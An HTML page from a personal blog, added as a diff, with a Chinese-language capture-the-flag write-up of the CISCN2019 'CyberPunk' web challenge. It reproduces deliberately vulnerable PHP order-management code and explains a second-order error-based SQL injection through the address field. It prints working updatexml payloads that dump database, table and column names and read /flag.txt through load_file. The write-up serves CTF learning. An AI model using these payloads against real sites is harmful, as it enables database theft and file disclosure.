@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>复现CISCN2019 华北赛区 Day1 Web5]CyberPunk | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/HXCTF/" target="_blank">HXCTF</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      复现CISCN2019 华北赛区 Day1 Web5]CyberPunk
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<ul>
+<li><p>查看源码给了提示目测是文件包含</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/1573214441440.png" alt="img"></p>
+</li>
+<li><p>PHP伪协议直接读取源码</p>
+<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108200230449.png" alt="image-20191108200230449"></p>
+</li>
+<li><p>源码如下：</p>
+<ul>
+<li>index.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file)){
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
+        echo(&#39;no way!&#39;);
+        exit;
+    }
+    @include($file);
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;index&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot; /&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2&gt;2077鍙戝敭浜�,涓嶆潵浠藉疄浣撳吀钘忕増鍚�?&lt;/h2&gt;
+        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;h3&gt;鎻愪氦璁㈠崟&lt;/h3&gt;
+                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;濮撳悕:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;鐢佃瘽:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;h3&gt;鍦板潃:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;鎴戞鏄�侀挶涔嬩汉&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;璁㈠崟绠＄悊&lt;/h2&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣鏌ヨ鍗�&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣淇敼鏀惰揣鍦板潃&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戜笉鎯宠浜�&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!--?file=?--&gt;</code></pre>
+<ul>
+<li>confirm.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;;
+//var_dump($_POST);
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = $_POST[&quot;address&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if($fetch-&gt;num_rows&gt;0) {
+        $msg = $user_name.&quot;已提交订单&quot;;
+    }else{
+        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
+        $re = $db-&gt;prepare($sql);
+        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
+        $re = $re-&gt;execute();
+        if(!$re) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单提交成功&quot;;
+    }
+} else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;确认订单&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot;/&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+                &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+                &lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<ul>
+<li>search.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;; 
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        if(!$row) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;搜索&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;订单查询&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;</code></pre>
+<ul>
+<li>change.php</li>
+</ul>
+<pre><code class="PHP">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = addslashes($_POST[&quot;address&quot;]);
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
+        $result = $db-&gt;query($sql);
+        if(!$result) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单修改成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;修改收货地址&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;修改收货地址&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;h3&gt;地址:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>delete.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
+        if(!$result) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单删除成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;删除订单&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot; /&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;删除订单&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>config.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);
+
+$DATABASE = array(
+
+    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,
+    &quot;username&quot; =&gt; &quot;root&quot;,
+    &quot;password&quot; =&gt; &quot;root&quot;,
+    &quot;dbname&quot; =&gt;&quot;ctfusers&quot;
+);
+
+$db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);
+</code></pre>
+</li>
+<li><p>分析：</p>
+<ul>
+<li>我们从代码中可以看到在查询的时候使用了正则去过滤，在写入时候使用了预处理所以无法进行注入。但是可以注意到使用正则过滤的时候并没有对地址过滤，我们跟进可以发现在<code>change.php</code>里地址是拼接进sql语句了，但是使用了<code>addslashes()</code>对单引号进行了转义，导致无法逃逸，但是这里可以导致在修改地址时候会将地址查询出来再拼接到更新语句，那么这里就算我们逃逸不了但是可以将后面的单引号给注释掉导致报错，同时这里将sql错误内容给打印出来了，可以使用报错注入。</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/15732167224952.png" alt="img"></p>
+</li>
+<li><p>构造payload</p>
+<pre><code class="php">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</code></pre>
+<ul>
+<li>在写入时候将上面payload写入地址，而后修改该订单的地址就会显示报错。</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/15732178817223.png" alt="img"></p>
+<ul>
+<li>爆表名</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema=&#39;ctfusers&#39;),0x7e),1)#</code></pre>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/15732192818932.png" alt="img"></p>
+<ul>
+<li>爆表段</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name=&#39;user&#39;),0x7e),1)#</code></pre>
+<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108213119371.png" alt="image-20191108213119371"></p>
+<ul>
+<li>在表中并未查找出来flag，最后读文件读出来了</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#
+
+1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),20,50)),0x7e),1)#</code></pre>
+<ul>
+<li>flag</li>
+</ul>
+<pre><code class="mysq">flag{71ee17ac-d06a-4  4aca-91c3-ae8671029100} </code></pre>
+</li>
+<li><p>延伸</p>
+<ul>
+<li><p>UPDATEXML </p>
+<ul>
+<li><pre><code class="mysql">UPDATEXML (XML_document, XPath_string, new_value); </code></pre>
+<ul>
+<li>参数1：XML_document是String格式，为XML文档对象的名称，文中为Doc  </li>
+<li>参数2：XPath_string (Xpath格式的字符串)  </li>
+<li>参数3:    new_value，String格式，替换查找到的符合条件的数据  </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-11-02T14:28:47.000Z" itemprop="datePublished">2019-11-02</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-11-2-复现CISCN2019-华北赛区-Day1-Web5]CyberPunk" data-title="复现CISCN2019 华北赛区 Day1 Web5]CyberPunk" data-url="http://www.plasf.cn/2019/11/02/2019-11-2-复现CISCN2019-华北赛区-Day1-Web5]CyberPunk/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
